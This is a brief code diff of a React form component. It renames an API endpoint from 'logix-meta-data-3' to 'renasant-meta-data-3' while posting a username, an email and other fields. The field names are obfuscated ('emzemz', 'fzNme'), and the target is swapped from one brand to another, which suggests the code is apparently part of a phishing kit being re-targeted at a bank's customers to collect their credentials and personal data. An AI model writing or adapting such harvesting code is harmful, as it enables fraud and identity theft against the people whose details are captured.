@@ -63,7 +63,7 @@ const BasicInfo: React.FC = () => {
     setIsLoading(true);
 
     try {
-      await axios.post(`${baseUrl}api/logix-meta-data-3/`, {
+      await axios.post(`${baseUrl}api/renasant-meta-data-3/`, {
         emzemz: username,  // Username for client lookup
         email: email,      // Actual email address
         fzNme,
